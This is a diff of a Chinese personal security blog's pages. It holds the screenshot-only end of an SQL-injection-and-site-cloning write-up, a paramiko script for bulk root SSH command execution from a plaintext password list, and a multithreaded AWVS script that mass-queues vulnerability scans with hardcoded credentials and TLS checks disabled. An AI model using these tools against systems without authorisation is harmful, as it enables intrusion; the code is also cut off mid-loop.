+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005542256.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005036885.png"></p>
+<p>还原成功</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005668937.png"></p>
+<h2 id="IIS与ASP-46-NET"><a href="#IIS与ASP-46-NET" class="headerlink" title="IIS与ASP&#46;NET"></a>IIS与ASP&#46;NET</h2><p>安装一笔带过，左边拉满就行，简单粗暴</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E9%9D%9E%E6%B3%95%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%95%B4%E7%AB%99%E6%89%93%E5%8C%85%E4%B8%8E%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/1570009391745.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005941688.png"></p>
+<p>添加站点</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006040656.png"></p>
+<p>最好对应目标版本</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006101941.png"></p>
+<p>修改源码中的配置文件</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006327636.png"></p>
+<p>访问</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006383401.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -179,7 +336,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -200,6 +357,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -207,7 +365,15 @@
   <time datetime="2019-09-29T16:00:00.000Z" itemprop="datePublished">2019-09-30</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <p>欢迎使用 <strong>{小书匠}(xiaoshujiang)编辑器</strong>，您可以通过==设置==里的修改模板来改变新建文章的内容。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -220,7 +386,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -241,6 +407,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -248,7 +415,15 @@
   <time datetime="2019-05-10T16:00:00.000Z" itemprop="datePublished">2019-05-11</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <p>欢迎使用 <strong>{小书匠}(xiaoshujiang)编辑器</strong>，您可以通过==设置==里的修改模板来改变新建文章的内容。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -261,7 +436,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -282,6 +457,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -289,7 +465,19 @@
   <time datetime="2019-05-10T16:00:00.000Z" itemprop="datePublished">2019-05-11</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近由于工作的原因，需要给客户安装防护软件，由于对方大部分机器都是Linux系统并且未使用运维管理类的软件。因此需要人工一台台登录执行命令（数量大约2000台），但所幸的是软件的安装部署已集成脚本，只需要执行./ 执行即可。</p>
+<p>前后写过两次脚本，第一次由于没有考虑到root账号不能直接ssh登录，无法正常执行安装。因此第二次增加了执行su -l后自动填入密码切换至root权限后再执行。</p>
+<h1 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h1><p>Windows 2012 + Python2.7 + paramiko模块<br>此环境为申请到的堡垒机，其他设备不能直接接入内网。<br>（由于paramiko模块并非Python自带，需要pip或者手动安装，鉴于机器处在物理隔离的环境中，因此选择手动安装。）</p>
+<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>根据客户给出的系统密码表excel，将机器信息整理成以下格式并保存为txt（ip:user:pass:port:root_pw）程序会自动读取txt内容，然后进行登录-&gt;切换权限-&gt;执行命令。</p>
+<p>##################（晚点填）###################</p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">cmdtext = <span class="string">&#x27;uname -r&#x27;</span><span class="comment">#要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verification_ssh</span>(<span class="params">host,username,password,port,root_pwd,cmd</span>):</span></span><br><span class="line"></span><br><span class="line">    s=paramiko.SSHClient()</span><br><span class="line">    s.load_system_host_keys()</span><br><span class="line">    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    s.connect(hostname = host,port=<span class="built_in">int</span>(port),username=username, password=password)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;root&#x27;</span>:</span><br><span class="line">        ssh = s.invoke_shell()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        ssh.send(<span class="string">&#x27;su -\n&#x27;</span>)</span><br><span class="line">        buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buff.endswith(<span class="string">&#x27;Password: &#x27;</span>):</span><br><span class="line">            resp = ssh.recv(<span class="number">9999</span>)</span><br><span class="line">            buff +=resp</span><br><span class="line">        ssh.send(root_pwd)</span><br><span class="line">        ssh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buff.endswith(<span class="string">&#x27;# &#x27;</span>):</span><br><span class="line">            resp = ssh.recv(<span class="number">9999</span>)</span><br><span class="line">            buff +=resp</span><br><span class="line">        ssh.send(cmd)</span><br><span class="line">        ssh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buff.endswith(<span class="string">&#x27;# &#x27;</span>):</span><br><span class="line">            resp = ssh.recv(<span class="number">9999</span>)</span><br><span class="line">            buff +=resp</span><br><span class="line">        s.close()</span><br><span class="line">        result = buff</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stdin, stdout, stderr = s.exec_command(cmd)</span><br><span class="line">        result = stdout.read()</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ssh.txt&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> i[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ssh_list = i.strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = verification_ssh(host=ssh_list[<span class="number">0</span>], username=ssh_list[<span class="number">2</span>],password=ssh_list[<span class="number">3</span>],port=ssh_list[<span class="number">1</span>],root_pwd=ssh_list[<span class="number">4</span>],cmd=cmdtext)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;Install G01 success&#x27;</span> <span class="keyword">in</span> result:<span class="comment"># 判断是否安装成功</span></span><br><span class="line">                    <span class="built_in">print</span> ssh_list[<span class="number">0</span>],<span class="string">&#x27;Install G01 Success!&#x27;</span></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;install_log.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        text = ssh_list[<span class="number">0</span>]+<span class="string">&quot;-----------------------\n&quot;</span>+result+<span class="string">&quot;-----------------------\n&quot;</span></span><br><span class="line">                        f.write(text)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;FAILED&#x27;</span> <span class="keyword">in</span> result:<span class="comment">#判断相关服务未启动</span></span><br><span class="line">                    <span class="built_in">print</span> ssh_list[<span class="number">0</span>],<span class="string">&#x27;FAILED&#x27;</span></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FAILED_log.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        text = ssh_list[<span class="number">0</span>] + <span class="string">&quot;-----------------------\n&quot;</span> + result + <span class="string">&quot;-----------------------\n&quot;</span></span><br><span class="line">                        f.write(text)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> ssh_list[<span class="number">0</span>],<span class="string">&#x27;Install Error&#x27;</span><span class="comment">#判断安装失败</span></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;error.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        text = ssh_list[<span class="number">0</span>] + <span class="string">&quot;-----------------------\n&quot;</span> + result + <span class="string">&quot;-----------------------\n&quot;</span></span><br><span class="line">                        f.write(text)</span><br><span class="line">            <span class="keyword">except</span>:<span class="comment">#无法ssh</span></span><br><span class="line">                <span class="built_in">print</span> ssh_list[<span class="number">0</span>],<span class="string">&#x27;ssh error&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;no_ssh.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    text = ssh_list[<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                    f.write(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -302,7 +490,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -323,6 +511,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -330,7 +519,27 @@
   <time datetime="2019-03-31T16:00:00.000Z" itemprop="datePublished">2019-04-01</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在原先增加多线程的基础上做了两处修改。<br>1.awvs中密码不需要手动加密成sha256<br>2.增加6种扫描模式（AWVS中的，原先是默认全扫描）</p>
+<p>讲道理awvs在web扫描种还是有不错的效果（没钱）</p>
+<p>立个flag：有时间了就捣鼓下基于awvs引擎的扫描器，换个皮，输入输出，伟大的国产扫描器诞生了！售价五毛钱一斤（手动滑稽）</p>
+<h1 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h1><p><img src="https://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1554111962355.jpg"></p>
+<p><img src="https://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1554112429679.jpg"></p>
+<p><img src="https://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1554112029272.jpg"></p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># python2.7</span><br><span class="line">import urllib2</span><br><span class="line">import ssl</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">thread_max = 100  # 程序线程</span><br><span class="line">threads = []</span><br><span class="line">del_int = 10 #循环删除次数</span><br><span class="line">URL_FILE = &#x27;url.txt&#x27;#要扫描的url列表（不加http://）</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">----------改动---------</span><br><span class="line">1.awvs密码不需要手动进行sha256加密</span><br><span class="line">2.增加六种扫描方式</span><br><span class="line">----------改动---------</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#The second revision comes from GuoKer</span><br><span class="line"># localhost:3443全部替换为awvs所在的服务器及端口</span><br><span class="line">username = &#x27;admin@admin.com&#x27;</span><br><span class="line">password = &#x27;Admin123456&#x27;</span><br><span class="line"># 账号邮箱与密码明文</span><br><span class="line">pw = hashlib.sha256(password).hexdigest()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">	_create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line">except AttributeError:</span><br><span class="line">	pass</span><br><span class="line">else:</span><br><span class="line">	ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line"></span><br><span class="line">patterns = [</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111112&#x27;,</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111115&#x27;,</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111117&#x27;,</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111116&#x27;,</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111113&#x27;,</span><br><span class="line">    &#x27;11111111-1111-1111-1111-111111111111&#x27;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url_login = &quot;https://localhost:3443/api/v1/me/login&quot;</span><br><span class="line">send_headers_login = &#123;</span><br><span class="line">    &#x27;Host&#x27;: &#x27;localhost:3443&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/json;charset=utf-8&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data_login = &#x27;&#123;&quot;email&quot;:&quot;&#x27; + username + &#x27;&quot;,&quot;password&quot;:&quot;&#x27; + pw + &#x27;&quot;,&quot;remember_me&quot;:false&#125;&#x27;</span><br><span class="line"></span><br><span class="line">req_login = urllib2.Request(url_login, headers=send_headers_login)</span><br><span class="line">response_login = urllib2.urlopen(req_login, data_login)</span><br><span class="line">xauth = response_login.headers[&#x27;X-Auth&#x27;]</span><br><span class="line">COOOOOOOOkie = response_login.headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line">#print&quot;当前验证信息如下\r\n cookie : %r  \r\n X-Auth : %r  &quot; % (COOOOOOOOkie, xauth)</span><br><span class="line">send_headers2 = &#123;</span><br><span class="line">    &#x27;Host&#x27;: &#x27;localhost:3443&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/json;charset=utf-8&#x27;,</span><br><span class="line">    &#x27;X-Auth&#x27;: xauth,</span><br><span class="line">    &#x27;Cookie&#x27;: COOOOOOOOkie</span><br><span class="line">&#125;</span><br><span class="line"># 以上代码实现登录（获取cookie）和校验值</span><br><span class="line">#-------------------------------------------------------------------------</span><br><span class="line">url = &quot;https://localhost:3443/api/v1/targets&quot;</span><br><span class="line">def add_exec_scan(url_txt):</span><br><span class="line">    target_url = &#x27;http://&#x27; + url_txt</span><br><span class="line">    data = &#x27;&#123;&quot;description&quot;:&quot;222&quot;,&quot;address&quot;:&quot;&#x27; + target_url + &#x27;&quot;,&quot;criticality&quot;:&quot;10&quot;&#125;&#x27;</span><br><span class="line">    # data = urllib.urlencode(data)由于使用json格式所以不用添加</span><br><span class="line">    req = urllib2.Request(url, headers=send_headers2)</span><br><span class="line">    response = urllib2.urlopen(req, data)</span><br><span class="line">    jo = json.loads(response.read())</span><br><span class="line">    target_id = jo[&#x27;target_id&#x27;]  # 获取添加后的任务ID</span><br><span class="line">    # 以上代码实现批量添加</span><br><span class="line"></span><br><span class="line">    url_scan = &quot;https://localhost:3443/api/v1/scans&quot;</span><br><span class="line">    headers_scan = &#123;</span><br><span class="line">        &#x27;Host&#x27;: &#x27;localhost:3443&#x27;,</span><br><span class="line">        &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/json;charset=utf-8&#x27;,</span><br><span class="line">        &#x27;X-Auth&#x27;: xauth,</span><br><span class="line">        &#x27;Cookie&#x27;: COOOOOOOOkie,</span><br><span class="line">    &#125;</span><br><span class="line">    #3 = xss</span><br><span class="line">    data_scan = &#x27;&#123;&quot;target_id&quot;:&#x27; + &#x27;\&quot;&#x27; + target_id + &#x27;\&quot;&#x27; + &#x27;,&quot;profile_id&quot;:\&quot;&#x27;+patterns[patter-1]+&#x27;\&quot;,&quot;schedule&quot;:&#123;&quot;disable&quot;:false,&quot;start_date&quot;:null,&quot;time_sensitive&quot;:false&#125;,&quot;ui_session_id&quot;:&quot;66666666666666666666666666666666&quot;&#125;&#x27;</span><br><span class="line">    req_scan = urllib2.Request(url_scan, headers=headers_scan)</span><br><span class="line">    response_scan = urllib2.urlopen(req_scan,str(data_scan))</span><br><span class="line">    print target_url + &quot;添加成功！&quot;</span><br><span class="line">    threads.pop(0)#线程序结束标志</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def count():</span><br><span class="line">    url_count = &quot;https://localhost:3443/api/v1/notifications/count&quot;</span><br><span class="line">    req_count = urllib2.Request(url_count, headers=send_headers2)</span><br><span class="line">    response_count = urllib2.urlopen(req_count)</span><br><span class="line">    print&quot;当前存在%r个通知！&quot; % json.loads(response_count.read())[&#x27;count&#x27;]</span><br><span class="line">    print&quot;-&quot; * 20</span><br><span class="line">    # print&quot;已存在以下任务&quot;</span><br><span class="line">    url_info = &quot;https://localhost:3443/api/v1/scans&quot;</span><br><span class="line">    req_info = urllib2.Request(url_info, headers=send_headers2)</span><br><span class="line">    response_info = urllib2.urlopen(req_info)</span><br><span class="line">    all_info = json.loads(response_info.read())</span><br><span class="line">    num = 0</span><br><span class="line">    for website in all_info.get(&quot;scans&quot;):</span><br><span class="line">        num += 1</span><br><span class="line">        # print</span><br><span class="line">        # website.get(&quot;target&quot;).get(&quot;address&quot;) + &quot;\n target_id:&quot; + website.get(&quot;scan_id&quot;)</span><br><span class="line">    print&quot;共 %r个扫描任务(最多显示100个))&quot; % num</span><br><span class="line"># count()</span><br><span class="line"># scan、target、notification！</span><br><span class="line">def del_targets():</span><br><span class="line">    url_info = &quot;https://localhost:3443/api/v1/targets&quot;</span><br><span class="line">    req_info = urllib2.Request(url_info, headers=send_headers2)</span><br><span class="line">    response_info = urllib2.urlopen(req_info)</span><br><span class="line">    all_info = json.loads(response_info.read())</span><br><span class="line">    for website in all_info[&quot;targets&quot;]:</span><br><span class="line">        while True:</span><br><span class="line">            if thread_max &gt; len(threads):</span><br><span class="line">                threads.append(threading.Thread(target=del_tmp,args=(website,)).start())#启动子线程</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># del_targets()</span><br><span class="line">def del_tmp(website): #删除任务</span><br><span class="line">    if (website.get(&quot;description&quot;)) == &quot;222&quot;:</span><br><span class="line">        try:</span><br><span class="line">            url_scan_del = &quot;https://localhost:3443/api/v1/targets/&quot; + str(website[&quot;target_id&quot;])</span><br><span class="line">            req_del = urllib2.Request(url_scan_del, headers=send_headers2)</span><br><span class="line">            req_del.get_method = lambda: &#x27;DELETE&#x27;</span><br><span class="line">            response_del = urllib2.urlopen(req_del)</span><br><span class="line">            print &quot;ok!&quot;</span><br><span class="line">            threads.pop(0)#线程序结束标志</span><br><span class="line">        except:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print &quot;-&quot; * 20</span><br><span class="line">    count()</span><br><span class="line">    print&quot;&quot;&quot;</span><br><span class="line">    1、添加扫描任务并执行请输入1</span><br><span class="line">    2、删除所有使用该脚本添加的任务请输入2</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    choice = raw_input(&quot;&gt;&quot;)</span><br><span class="line">    #	print type(choice)</span><br><span class="line"></span><br><span class="line">    if choice == &quot;1&quot;:</span><br><span class="line">        print&quot;&quot;&quot;</span><br><span class="line">        #1.高风险漏洞</span><br><span class="line">        #2.弱密码扫描</span><br><span class="line">        #3.仅爬行</span><br><span class="line">        #4.XSS跨站扫描</span><br><span class="line">        #5.SQL注入扫描</span><br><span class="line">        #6.全扫描</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        patter = int(input(&quot;&gt;&gt;&quot;))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        for url_txt in open(URL_FILE,&#x27;r&#x27;).read().split():</span><br><span class="line">            while True:</span><br><span class="line">                if thread_max &gt; len(threads):</span><br><span class="line">                    # threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,)).start())#启动线程</span><br><span class="line">                    t = threading.Thread(target=add_exec_scan,args=(url_txt,))</span><br><span class="line">                    t.start()</span><br><span class="line">                    